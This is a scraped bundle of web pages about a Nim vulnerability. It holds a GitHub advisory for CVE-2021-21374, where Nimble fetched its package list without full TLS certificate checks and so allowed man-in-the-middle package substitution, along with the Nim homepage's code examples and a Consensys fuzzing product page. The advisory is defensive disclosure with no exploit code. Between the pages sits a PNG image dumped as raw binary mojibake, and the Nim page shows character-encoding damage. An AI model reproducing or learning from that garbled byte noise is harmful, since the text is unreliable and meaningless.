=== Content from github.com_6fa16f28_20250115_195719.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fsecurity%2Fsecurity%2Fadvisories%2FGHSA-c2wm-v66h-xhxx)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2Fsecurity%2Fsecurity%2Fadvisories%2FGHSA-c2wm-v66h-xhxx)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=nim-lang%2Fsecurity)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nim-lang](/nim-lang)
/
**[security](/nim-lang/security)**
Public

* [Notifications](/login?return_to=%2Fnim-lang%2Fsecurity) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fnim-lang%2Fsecurity)
* [Star
   5](/login?return_to=%2Fnim-lang%2Fsecurity)

* [Code](/nim-lang/security)
* [Issues
  1](/nim-lang/security/issues)
* [Pull requests
  0](/nim-lang/security/pulls)
* [Actions](/nim-lang/security/actions)
* [Projects
  0](/nim-lang/security/projects)
* [Security](/nim-lang/security/security)
* [Insights](/nim-lang/security/pulse)

Additional navigation options

* [Code](/nim-lang/security)
* [Issues](/nim-lang/security/issues)
* [Pull requests](/nim-lang/security/pulls)
* [Actions](/nim-lang/security/actions)
* [Projects](/nim-lang/security/projects)
* [Security](/nim-lang/security/security)
* [Insights](/nim-lang/security/pulse)

# Nimble fails to validate certificates due to insecure httpClient defaults

High

[FedericoCeratto](/FedericoCeratto)
published
GHSA-c2wm-v66h-xhxx
Mar 26, 2021

## Package

Nimble
(Nim)

## Affected versions

< 1.4.4 (Nim release version)

## Patched versions

1.2.10 and 1.4.4

## Description

### Impact

"nimble refresh" fetches a list of Nimble packages over HTTPS without full verification of the SSL/TLS certificate due to the default setting of httpClient.

An attacker able to perform MitM can deliver a modified package list containing malicious software packages. If the packages are installed and used the attack escalates to untrusted code execution.

### References

<https://consensys.net/diligence/vulnerabilities/nim-insecure-ssl-tls-defaults-remote-code-execution/>

### Severity

High

8.1

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
Low

Integrity
High

Availability
Low

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:L

### CVE ID

CVE-2021-21374

### Weaknesses

[CWE-348](/advisories?query=cwe%3A348) [CWE-349](/advisories?query=cwe%3A349) [CWE-599](/advisories?query=cwe%3A599)

### Credits

* [![@tintinweb](https://avatars.githubusercontent.com/u/2865694?s=40&v=4)](/tintinweb)
  [tintinweb](/tintinweb)
  Analyst

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from nim-lang.org_88341cf2_20250115_195718.html ===

[![Nim](/assets/img/logo.svg)](/)

* [Blog](/blog.html)
* [Features](/features.html)
* [Download](/install.html)
* [Documentation](/documentation.html)
* [Forum](https://forum.nim-lang.org)
* [Donate](/donate.html)
* [Source](https://github.com/nim-lang/Nim)

# Efficient, expressive, elegant

## Nim is a statically typed compiled systems programming language. It combines successful concepts from mature languages like Python, Ada and Modula.

[Install Nim 2.2.0](/install.html)
[Try it online](https://play.nim-lang.org/#ix=2lK1)
### Efficient

* Nim generates native dependency-free executables, not dependent on a virtual machine,
  which are small and allow easy redistribution.
* The Nim compiler and the generated executables support all major platforms like
  Windows, Linux, BSD and macOS.
* Nim's memory management is deterministic and customizable with destructors and move
  semantics, inspired by C++ and Rust.
  It is well-suited for embedded, hard-realtime systems.
* Modern concepts like zero-overhead iterators and compile-time evaluation
  of user-defined functions, in combination with the preference of value-based
  datatypes allocated on the stack, lead to extremely performant code.
* Support for various backends: it compiles to C, C++ or JavaScript so that Nim
  can be used for all backend and frontend needs.

### Expressive

* Nim is self-contained: the compiler and the standard library are implemented in Nim.
* Nim has a powerful macro system which allows direct manipulation of the AST,
  offering nearly unlimited opportunities.

### Elegant

* Macros cannot change Nim's syntax because there is no need for it √¢¬Ä¬î
  the syntax is flexible enough.
* Modern type system with local type inference, tuples, generics and sum types.
* Statements are grouped by indentation but can span multiple lines.

Simple example
If√¢¬Ä¬¶else, Case switch
Basic math
String operations
Comprehensions

````
import std/strformat

type
  Person = object
    name: string
    age: Natural # Ensures the age is positive

let people = [
  Person(name: "John", age: 45),
  Person(name: "Kate", age: 30)
]

for person in people:
  # Type-safe string interpolation,
  # evaluated at compile time.
  echo(fmt"{person.name} is {person.age} years old")

# Thanks to Nim's 'iterator' and 'yield' constructs,
# iterators are as easy to write as ordinary
# functions. They are compiled to inline loops.
iterator oddNumbers[Idx, T](a: array[Idx, T]): T =
  for x in a:
    if x mod 2 == 1:
      yield x

for odd in oddNumbers([3, 6, 9, 12, 15, 18]):
  echo odd

# Use Nim's macro system to transform a dense
# data-centric description of x86 instructions
# into lookup tables that are used by
# assemblers and JITs.
import macros, strutils

macro toLookupTable(data: static[string]): untyped =
  result = newTree(nnkBracket)
  for w in data.split(';'):
    result.add newLit(w)

const
  data = "mov;btc;cli;xor"
  opcodes = toLookupTable(data)

for o in opcodes:
  echo o
````
````
var conditional = 42

if conditional < 0:
  echo "conditional < 0"
elif conditional > 0:
  echo "conditional > 0"
else:
  echo "conditional == 0"

var ternary = if conditional == 42: true else: false

var another =
  if conditional == 0:
    "zero"
  elif conditional mod 2 == 0:
    "even"
  else:
    "odd"

# Case switch.
var letter = 'c'

case letter
of 'a':
  echo "letter is 'a'"
of 'b', 'c':
  echo "letter is 'b' or 'c'"
of 'd'..'h':
  echo "letter is between 'd' and 'h'"
else:
  echo "letter is another character"
````
````
import std/math

# Basic math.
assert 1 + 2 == 3        # Sum
assert 4 - 1 == 3        # Subtraction
assert 2 * 2 == 4        # Multiplication
assert 4 / 2 == 2.0      # Division
assert 4 div 2 == 2      # Integer Division
assert 2 ^ 3 == 8        # Power
assert 4 mod 2 == 0      # Modulo
assert (2 xor 4) == 6    # XOR
assert (4 shr 2) == 1    # Shift Right
assert PI * 2 == TAU     # PI and TAU
assert sqrt(4.0) == 2.0  # Square Root
assert round(3.5) == 4.0 # Round
assert isPowerOfTwo(16)  # Powers of Two
assert floor(2.9) == 2.0 # Floor
assert ceil(2.9) == 3.0  # Ceil
assert cos(TAU) == 1.0   # Cosine
assert gcd(12, 8) == 4   # Greatest common divisor
assert trunc(1.75) == 1.0     # Truncate
assert floorMod(8, 3) == 2    # Floor Modulo
assert floorDiv(8, 3) == 2    # Floor Division
assert hypot(4.0, 3.0) == 5.0 # Hypotenuse
assert gamma(4.0) == 6.0      # Gamma function
assert radToDeg(TAU) == 360.0 # Radians to Degrees
assert clamp(1.4, 0.0 .. 1.0) == 1.0 # Clamp
assert almostEqual(PI, 3.14159265358979)
assert euclDiv(-13, -3) == 5  # Euclidean Division
assert euclMod(-13, 3) == 2   # Euclidean Modulo
````
````
import std/[strutils, strscans]

assert "con" & "cat" == "concat"
assert "    a    ".strip == "a"
assert "42".parseInt == 42
assert "3.14".parseFloat == 3.14
assert "0x666".parseHexInt == 1638
assert "TrUe".parseBool == true
assert "0o777".parseOctInt == 511
assert "a".repeat(9) == "aaaaaaaaa"
assert "abc".startsWith("ab")
assert "abc".endsWith("bc")
assert ["a", "b", "c"].join == "abc"
assert "abcd".find("c") == 2
assert "a x a y a z".count("a") == 3
assert "A__B__C".normalize == "abc"
assert "a,b".split(",") == @["a", "b"]
assert "a".center(5) == "  a  "
assert "a".indent(4) == "    a"
assert "    a".unindent(4) == "a"

for word in tokenize("This is an example"):
  echo word

let (ok, year, month, day) = scanTuple("1000-01-01", "$i-$i-$i")
if ok:
  assert year == 1000
  assert month == 1
  assert day == 1
````
````
import std/[sugar, tables, sets, sequtils, strutils]

let variable0 = collect(newSeq):
  for item in @[-9, 1, 42, 0, -1, 9]:
    item * 2

assert variable0 == @[-18, 2, 84, 0, -2, 18]

let variable1 = collect(initTable):
  for key, value in @[0, 5, 9]:
    {key: value div 2}

assert variable1 == {0: 0, 1: 2, 2: 4}.toTable

let variable2 = collect(initHashSet):
  for item in @[-9, 1, 42, 0, -1, 9]:
    {item + item}

assert variable2 == [2, 18, 84, 0, -18, -2].toHashSet

assert toSeq(1..15).mapIt(
    if it mod 15 == 0:  "FizzBuzz"
    elif it mod 5 == 0: "Buzz"
    elif it mod 3 == 0: "Fizz"
    else: $it
  ).join(" ").strip == "1 2 Fizz 4 Buzz Fizz 7 8 Fizz Buzz 11 Fizz 13 14 FizzBuzz"
````

[More examples at RosettaCode√¢¬Ä¬¶](http://rosettacode.org/wiki/Category%3ANim)

# Recent articles

24 December 2024

## [Nim version 2.0.14 released](/blog/2024/12/24/nim-2014-released.html)

The Nim team is happy to announce Nim version 2.0.14, our seventh patch release for Nim 2.0,
for our users who haven√¢¬Ä¬ôt switched yet to [Nim 2.2](https://nim-lang.org/blog/2024/10/02/nim-220-2010.html).

09 December 2024

## [Launching the 2024 Nim Community Survey](/blog/2024/12/09/community-survey-2024.html)

We are proud to announce the launch of the official
[2024 Nim Community Survey](https://forms.gle/s6WomUFyUANijhrL6)!

[All articles](/blog.html)

![](/assets/img/mastering_nim.jpg)
# Mastering Nim

### The definite guide on Nim!

### Written by the inventor himself.

### Now with updated content for version 2.0 which solves the biggest pain point of Nim 1.0, shared memory in a multi-threaded setting.

[Buy it on amazon.com](https://www.amazon.com/dp/B0B4R7B9YX)
[Buy it on amazon.de](https://www.amazon.de/dp/B0B4R7B9YX)

# Support Nim

## Join the 100+ companies and individuals that support Nim

### The Nim project is developed globally by a group of volunteers. We welcome recurring donations, which enable us to spend more time working on Nim.

[Donate](/donate.html)

# Community

## Real-time chat

*#*Libera.chat#nim

[Discord/Nim](https://discord.gg/nim)

[Gitter/Nim](https://gitter.im/nim-lang/Nim)

[*m*#nim:envs.net](https://matrix.to/#/#nim:envs.net)

[*#*IRC Logs](https://irclogs.nim-lang.org)

[Telegram/nim\_lang](https://t.me/nim_lang)

## Forum

[forum.nim-lang.org](https://forum.nim-lang.org)

[r/nim](https://reddit.com/r/nim)

[StackOverflow](https://stackoverflow.com/questions/tagged/nim-lang)

## Bug reports

[nim-lang/Nim](https://github.com/nim-lang/Nim/issues)

## Twitter

[@nim\_lang](https://twitter.com/nim_lang)

[Join the community](/community.html)

# Looking for the GitHub repository?

### The Nim compiler and tools are all written in Nim and licensed under the MIT license, with most development taking place on GitHub. Be sure to watch the repository to get updates on Nim's development, or star it to give us some brownie points.

[Source code](https://github.com/nim-lang/Nim)

Unless otherwise stated, the content of this page is
licensed under the
[Creative Commons Attribution 3.0](https://creativecommons.org/licenses/by/3.0/)
license.
Code displayed on this website is MIT licensed.

This website is available on
[GitHub](https://github.com/nim-lang/website)
and contributions are welcome.
Original website design by
[Dominik Picheta](https://github.com/dom96) and
[Hugo Locurcio](https://github.com/Calinou).
Logo by [Joseph Wecker](https://github.com/josephwecker).

[![](/assets/img/do.png)](https://m.do.co/c/637ab907c7f4)



=== Content from avatars.githubusercontent.com_be36f689_20250115_195716.html ===
ÔøΩPNG

   
IHDR   (   (   ÔøΩ/:  wIDATxÔøΩÔøΩW}lÔøΩÔøΩyÔøΩÔøΩ€ªÔøΩc;ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩIÔøΩ(\*ÔøΩ5-EÔøΩ\*ÔøΩÔøΩ$\*ÔøΩ+ÔøΩÔøΩVÔøΩÔøΩÔøΩUDQ+ÔøΩÔøΩÔøΩO%\*ÔøΩÔøΩJÔøΩÔøΩÔøΩÔøΩ!ÔøΩ DMÔøΩ+!ÔøΩÔøΩ!ÔøΩÔøΩvlÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩTÔøΩÔøΩÔøΩ‹∑ÔøΩÔøΩRFÔøΩÔøΩÔøΩÔøΩÔøΩf~oÔøΩÔøΩXÔøΩŸã3ÔøΩtÔøΩ&ÔøΩÔøΩÔøΩÔøΩyKÔøΩ>ÔøΩuÔøΩpPÔøΩ"ÔøΩ@Hﬁ°…íÔøΩ%ÔøΩIÔøΩÔøΩY 0ÔøΩÔøΩÔøΩ
ÔøΩÔøΩ:$ÔøΩ›øÔøΩ?ÔøΩÔøΩKÔøΩ5+ÔøΩÔøΩ◊ävPÔøΩ‹∞ÔøΩÔøΩ
\A ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ·©°ÔøΩÔøΩÔøΩÔøΩÔøΩ(ÔøΩ60ÔøΩmÔøΩ5ÔøΩG‘åÔøΩ:ÔøΩÔøΩÔøΩ[]G ÔøΩÔøΩbÔøΩw!IdÔøΩÔøΩÔøΩÔøΩ¬• W `ÔøΩ?|ÔøΩÔøΩ ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩgÔøΩfÔøΩÔøΩÔøΩvÔøΩMÔøΩuÔøΩÔøΩÔøΩÔøΩÔøΩbÔøΩÔøΩ}q|P`ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ‹•-I$9pÔøΩtÔøΩ+ÔøΩ"ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ]ÔøΩ÷Ñ:Ã∏ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ
ÔøΩQu\_<ÔøΩÔøΩHÔøΩÔøΩÔøΩÔøΩUƒª'ÔøΩkeÔøΩfÔøΩÔøΩWnÔøΩÔøΩÔøΩ·¢∏wÔøΩÔøΩÔøΩÔøΩ=9ÔøΩÔøΩÔøΩSvÔøΩÔøΩmQg1!,ÔøΩndjÔøΩPÔøΩ5ÔøΩÔøΩÔøΩ2ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ0}ÔøΩ0mÔøΩÔøΩ`yjÔøΩÔøΩÔøΩcÔøΩÔøΩÔøΩÔøΩ|?ÔøΩÔøΩ=ÔøΩ[ÔøΩÔøΩZYÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ4ÔøΩÔøΩ8ÔøΩÔøΩp=ÔøΩ’≤iÔøΩÔøΩÔøΩ+ÔøΩÔøΩÔøΩÔøΩÔøΩ1]`ÔøΩ aÔøΩHÔøΩWÔøΩNÔøΩÔøΩÔøΩÔøΩ}6ÔøΩ;M~w6ÔøΩmÔøΩÔøΩ›èÔøΩÔøΩÔøΩd
ÔøΩsN\_ÔøΩ&oÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩkZÔøΩaWÔøΩÔøΩÔøΩÔøΩ=ÔøΩÔøΩZÔøΩ:ÔøΩ1ÔøΩ|ﬁøÔøΩÔøΩ/ÔøΩÔøΩÔøΩÔøΩoÔøΩH"ÔøΩ\*ÔøΩQ)ÔøΩÔøΩHÔøΩ)ÔøΩÔøΩÔøΩTÔøΩÔøΩ"AÔøΩB"\*[ÔøΩhÔøΩ»ë'ÔøΩ2⁄ÆÔøΩÔøΩnÔøΩÔøΩÔøΩÔøΩQuY]ÔøΩbÔøΩÔøΩfGÔøΩpÔøΩQvÔøΩÔøΩÔøΩ)[ÔøΩMUnÔøΩÔøΩÔøΩIÔøΩJÔøΩÔøΩpÔøΩPTÔøΩÔøΩ7JbÔøΩzÔøΩ}FÔøΩM\*ÔøΩJm#ÔøΩAÔøΩ'nUÔøΩ«õÔøΩÔøΩjÔøΩ#ÔøΩÔøΩDÔøΩÔøΩÔøΩc~r@2ÔøΩ;ÔøΩÔøΩ;ÔøΩRhÔøΩÔøΩÔøΩÔøΩsLÔøΩÔøΩ\*ÔøΩOÔøΩÔøΩ^|ÔøΩÔøΩÔøΩÔøΩÔøΩ=tÔøΩÔøΩÔøΩTYÔøΩ;ÔøΩÔøΩvMÔøΩÔøΩÔøΩÔøΩÔøΩ5ÔøΩÔøΩÔøΩYÔøΩÔøΩ^}ÔøΩÔøΩÔøΩÔøΩ+ÔøΩmÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩGiÔøΩ\_ÔøΩSÔøΩÔøΩ3@!OODÔøΩÔøΩC<ÔøΩÔøΩa/ÔøΩÔøΩÔøΩil4ÔøΩDÔøΩHÔøΩc[CeI`ÔøΩm8ÔøΩÔøΩ;JqÔøΩÔøΩuÔøΩkSÔøΩÔøΩ,ÔøΩLÔøΩ2ÔøΩÔøΩ?…îZÔøΩÔøΩÔøΩZÔøΩÔøΩÔøΩp5ÔøΩÔøΩÔøΩ]KRÈíÆ;5ÔøΩ5ÔøΩÔøΩÔøΩÔøΩjDGÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩxÔøΩpÔøΩÔøΩSÔøΩÔøΩÔøΩÔøΩÔøΩ+ÔøΩÔøΩÔøΩÔøΩ^ÔøΩX1\_xÔøΩÔøΩ=ÔøΩÔøΩY,ÔøΩÔøΩÔøΩÔøΩÔøΩH/jSÔøΩ!(ZÔøΩ[ÔøΩ-A“†+gMwMÔøΩÔøΩÔøΩsÔøΩÔøΩEÔøΩ
ÔøΩÔøΩKÔøΩ/ÔøΩÔøΩÔøΩÔøΩSÔøΩ[[ÔøΩÔøΩ~0ÔøΩÔøΩÔøΩT)ÔøΩÔøΩÔøΩÔøΩ;ÔøΩÿæ8ÔøΩUÔøΩr»¨ÔøΩÔøΩs|ÔøΩv|ÔøΩyÔøΩÔøΩ ÔøΩ0ÔøΩuÔøΩÔøΩOÔøΩ?ÔøΩÔøΩBÔøΩÔøΩ4ÔøΩ/>ÔøΩÔøΩ∆¨ÔøΩﬂêÔøΩÔøΩ'ÔøΩÔøΩ1EÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩMÔøΩ[ÔøΩÔøΩ^N]ÔøΩÀä<ÔøΩ{,(ÔøΩÔøΩÔøΩnÔøΩ?sÔøΩbŸèÔøΩ%ÔøΩÔøΩÔøΩvÔøΩÔøΩ7ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩTÔøΩ?ÔøΩÔøΩÔøΩ)"ÔøΩ$ÔøΩÔøΩ\’∂'[]]ÔøΩÔøΩ[zÔøΩ^@ÔøΩÔøΩﬁ™ÔøΩkÔøΩÔøΩ.ÔøΩ%ÔøΩÔøΩÁπé¬èÔøΩÔøΩÔøΩ 0ÔøΩvÔøΩ LÔøΩÔøΩ$3QaÔøΩÔøΩÔøΩÔøΩ ÔøΩ "2A\_ÔøΩÔøΩÔøΩÔøΩ]Cÿ¶ÔøΩ
wÔøΩ\_-ÔøΩÔøΩÔøΩÔøΩÔøΩ2zÔøΩ#ÔøΩ\_A\*ÔøΩ-ÔøΩR=≈äÔøΩÔøΩÔøΩbÔøΩÔøΩÔøΩ
?9s\*ÔøΩgÔøΩÔøΩJPÔøΩlnÔøΩÔøΩmÔøΩjÔøΩAÔøΩÔøΩÔøΩÔøΩÔøΩ%lÔøΩÔøΩ\_ÔøΩÔøΩ,ÔøΩÔøΩ/;ÔøΩÔøΩÔøΩ|≈≤ÔøΩÔøΩÔøΩÔøΩ/ÔøΩy+ÔøΩJÔøΩÔøΩÔøΩsÔøΩu="+hÔøΩMnÔøΩÔøΩ;ÔøΩÔøΩ[$ÔøΩm^~ÔøΩÔøΩ?ÔøΩ:ÔøΩjÔøΩ‹ÖÔøΩÔøΩ<1ÔøΩÔøΩ;ÔøΩÔøΩ"ÔøΩyBË∑ñÔøΩÔøΩÔøΩÀßY$ÔøΩÔøΩÔøΩÔøΩ0ÔøΩÔøΩÔøΩK5'ÔøΩVVwÔøΩÔøΩ+ÔøΩÔøΩÔøΩÔøΩVÔøΩ—ç%’≠3ÔøΩ+ÔøΩÔøΩ
ÔøΩXÔøΩNÔøΩÔøΩÔøΩt!$ÔøΩÔøΩEÔøΩ-9~ÔøΩÔøΩÔøΩ%
AÔøΩÔøΩÔøΩ$ÔøΩÔøΩlÔøΩ2⁄¶ÔøΩ\_ÔøΩ&ÔøΩ?ÔøΩ$EÔøΩ9PuÔøΩÔøΩÔøΩlÔøΩqƒ•ÔøΩ\nÔøΩ]ÔøΩ  ÔøΩÔøΩ.ÔøΩo~ÔøΩÔøΩ    IENDÔøΩB`ÔøΩ

=== Content from consensys.io_03fb8ddc_20250115_195716.html ===

[![Consensys Diligence](/images/logo/fuzzing-logo.svg)](/ "Home")

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")

# Fuzz it.

##### Let's go next level smart contract security with Diligence Fuzzing.

The most powerful fuzzer to find bugs and vulnerabilities before they are exploited by bad actors on mainnet. Combine with Scribble to set a target and unleash the fuzzer with millions of transactions to stress test your smart contract.

[Start Fuzzing](https://fuzzing.diligence.tools/login)
[Explore Scribble](https://consensys.io/diligence/scribble/)

![Fuzzing](https://diligence.consensys.io/fuzzing/fuzzing-hero-side-image.png)

## What the Fuzz?

#### Diligence Fuzzing gray-box property-based Fuzzing

Diligence Fuzzing is the smartest Fuzzer we know. Powered by cutting-edge research, this tool pioneered smart heuristics
to push the boundaries of gray-box fuzzing.
Save some time. We create unit tests AND system tests for you. All
you need to do is deploy your smart contract and unleash the fuzzer. It will
generate sequences of transactions (just like a user or an attacker
would) to cover your code.

[Read Docs](https://fuzzing-docs.diligence.tools/)

Coverage-guided

i.e., greybox fuzzing to build corpus of inputs that increases coverage.

Input Prediction

Our unique input prediction allows to systematically find inputs that will cover new code instead of random mutations.

[Learn more](https://consensys.io/diligence/blog/2018/12/fuzzing-smart-contracts-using-input-prediction/)

Transaction Sequence Simulation

We simulate multiple transaction sequences to test ‚Äúdeeper‚Äù interactions between functions.

Time Machine

Time machine to test functionality that may break in the future by simulating different time intervals between transactions

Incremental Fuzzing

Enables quick feedback when starting campaigns on code that was already fuzzed.

Fuzzing Lessons

Allows users to provide specific transaction sequences to increase coverage of critical parts of your code.

![](https://diligence.consensys.io/fuzzing/background-features.jpg)
#### Reporting Features

Comprehensive reporting about your fuzzing campaign.

Campaign Monitoring

Observe the Fuzzer covering more and more of your code while thousands of tests are executed per second. Indications like "Residual Risk" help to determine when to stop a campaign.

![](https://diligence.consensys.io/fuzzing/CoverageScreenshot.png)

Full Control

Whether a short test or extensive campaign, public or private report, single or multiple, parallel campaigns, you have full control over the platform.

![](https://diligence.consensys.io/fuzzing/PropertyViolationScreenshot.png)

Full Report

Find out immediately when a property has been violated. Details about the transaction that triggered a vulnerability help you to fix your code.

![](https://diligence.consensys.io/fuzzing/ReportControlScreenshot.png)

Observe the Fuzzer covering more and more of your code while thousands of tests are executed per second. Indications like "Residual Risk" help to determine when to stop a campaign.

![](https://diligence.consensys.io/fuzzing/CoverageScreenshot.png)

Whether a short test or extensive campaign, public or private report, single or multiple, parallel campaigns, you have full control over the platform.

![](https://diligence.consensys.io/fuzzing/PropertyViolationScreenshot.png)

Find out immediately when a property has been violated. Details about the transaction that triggered a vulnerability help you to fix your code.

![](https://diligence.consensys.io/fuzzing/ReportControlScreenshot.png)

Create a faster, more efficient and secure SDLC

With millions of transactions flowing daily, blockchain
companies need reliable tools to secure the growing internet
of value on the blockchain. Diligence Fuzzing provides:

Fuzzing at scale

Diligence Fuzzing is the only fuzzing solution to cover complex systems of one or more contracts to explore all possible user interactions and vulnerabilities, without the need for harnesses.

Comprehensive Security

Fuzzing minimizes risk and checks performance through the execution of millions of intelligently selected inputs, exploring all possible interactions with users and potential attackers.

Business Logic Integrity

Test business logic at the outset, check for correctness, and find security problems before they steer the ship astray.

Productivity

Code reviews and consecutive bug fixes are time-consuming, with long feedback loops. With Diligence Fuzzing, developers get swift, actionable feedback.

Readability

Scribble annotations of your specs improve an auditor‚Äôs ability to find flaws in your smart contracts.

## Start Diligence Fuzzing in 3 steps

Specify properties, submit code, inspect the report.

### Step 1

Define Scribble specifications

To use Diligence Fuzzing you first need to define specifications for your smart contract using Scribble, describing how your smart contracts should work. The fuzzer will use these Scribble properties to check for inconsistencies.

[Read Docs](https://docs.scribble.codes/)

![](https://diligence.consensys.io/fuzzing/Step1ScribbleScreenshot.png)

### Step 2

Submit code

Submit your code to the Diligence Platform to run fuzzing campaigns. We‚Äôll analyze all complex systems of one or more contracts provided to detect violations of custom properties.

[Read Docs](https://fuzzing-docs.diligence.tools/)

![](https://diligence.consensys.io/fuzzing/Step2CliScreenshot.png)

### Step 3

Review the results

Receive campaign results and fix the violations in your code.

![](https://diligence.consensys.io/fuzzing/Step3ViewReportScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step1ScribbleScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step2CliScreenshot.png)

![](https://diligence.consensys.io/fuzzing/Step3ViewReportScreenshot.png)

#### Trusted by businesses worldwide.

Our early adopters use Diligence Fuzzing to help secure their projects.

* + > With Diligence Fuzzing, Consensys gave us an amazing framework and capability to seamlessly develop, test and launch our smart contracts that are serving as the foundation for the new space economy.

    Grant Blaisdell

    CEO & Co-Founder of Copernic Space

    ![](https://diligence.consensys.io/fuzzing/TestemonialAvatar1.png)
  + > We deal with multiple clients who often require a fast, trusted and easy to understand service to conduct security audits on their Smart Contracts before they go live. We offer a service that includes the use of Diligence Fuzz tool to facilitate this and it is perfect for the job. Not only is it simple and easy to use, but it provides clear results for action along with quantifiable security guarantees from the Fuzzing process. We really enjoy using Diligence fuzz tool to provide this robust security check as part of our service!

    Tak Fung

    CEO & Founder of Smart Contract Security Limited

    ![](https://diligence.consensys.io/fuzzing/TestemonialAvatar2.png)

#### Simple pricing, for every need.

Get started with a free explorer plan or opt for our professional plans for builders. All plans billed monthly.

### Explorer

For users who want to explore fuzzing as an additional security layer.

#### $0

* 1x Core Performance
* Up to 100 5 min campaigns
* Run 1 Campaign at a time
* Supports Foundry projects

[Get Started](https://fuzzing.diligence.tools/login)

### Builder

For users who are ready to level up their security practices and stress test longer.

